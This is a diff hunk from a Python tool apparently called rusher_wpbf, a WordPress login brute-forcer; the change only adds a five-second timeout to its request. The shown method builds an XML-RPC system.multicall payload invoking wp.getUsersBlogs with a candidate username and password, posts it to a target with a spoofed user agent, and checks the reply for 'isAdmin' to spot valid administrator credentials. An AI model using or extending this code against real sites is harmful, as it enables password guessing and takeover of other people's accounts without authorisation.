@@ -28,7 +28,7 @@ class rusher_wpbf:
     def req(self, user, passwd):
 
         xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
-        x = requests.post(url=self.args.target, headers={ "User-Agent": self.useragent() }, data=xml)
+        x = requests.post(url=self.args.target, headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)
 
         if "<name>isAdmin</name>" in x.text:
 
